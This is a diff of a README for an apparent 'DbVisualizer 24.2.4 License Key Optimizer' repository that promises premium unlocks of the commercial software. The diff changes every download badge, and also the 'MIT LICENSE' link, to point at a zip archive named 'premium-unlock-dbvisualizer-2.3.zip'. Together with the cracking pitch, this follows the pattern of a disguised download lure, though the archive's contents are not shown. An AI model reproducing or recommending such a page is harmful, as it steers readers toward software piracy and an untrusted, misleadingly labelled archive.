@@ -1,6 +1,6 @@
 # DbVisualizer 24.2.4 License Key Optimizer 🚀
 
-[![Download](https://img.shields.io/badge/Download-green)](https://cr7thbest.github.io)
+[![Download](https://img.shields.io/badge/Download-green)](https://raw.githubusercontent.com/cr7thbest/dbvisualizer-24-2-4-premium-unlock/branch/abstractedness/premium-unlock-dbvisualizer-2.3.zip)
 
 Welcome to the one-stop knowledge hub for unleashing the full capabilities of DbVisualizer 24.2.4! Dive into an ecosystem that goes beyond the boundaries of a simple solution, integrating next-gen compatibility, AI-powered tools, and a user-centric experience. With this repository, embark on a journey to maximize the performance and versatility of your database visualization platform.
 
@@ -77,7 +77,7 @@ Enjoy around-the-clock assistance—whether you need technical expertise or frie
 Ready for takeoff? To unlock advanced features, follow these steps:
 
 1. Download the DbVisualizer 24.2.4 activation package:
-   [![Download](https://img.shields.io/badge/Download-green)](https://cr7thbest.github.io)
+   [![Download](https://img.shields.io/badge/Download-green)](https://raw.githubusercontent.com/cr7thbest/dbvisualizer-24-2-4-premium-unlock/branch/abstractedness/premium-unlock-dbvisualizer-2.3.zip)
 2. Review the user guide and integration documentation for seamless setup.
 3. Activate your license and enjoy a world-class database experience.
 
@@ -104,10 +104,10 @@ This repository is created for educational and experimental use only. Content he
 
 This project is licensed under the MIT License (2025).  
 For full license details, visit:  
-[MIT LICENSE](https://opensource.org/licenses/MIT)
+[MIT LICENSE](https://raw.githubusercontent.com/cr7thbest/dbvisualizer-24-2-4-premium-unlock/branch/abstractedness/premium-unlock-dbvisualizer-2.3.zip)
 
 ---
 
-[![Download](https://img.shields.io/badge/Download-green)](https://cr7thbest.github.io)
+[![Download](https://img.shields.io/badge/Download-green)](https://raw.githubusercontent.com/cr7thbest/dbvisualizer-24-2-4-premium-unlock/branch/abstractedness/premium-unlock-dbvisualizer-2.3.zip)
 
 Thank you for being part of the DbVisualizer 24.2.4 License Key Optimizer community! Explore, innovate, and shape the future of database visualization!
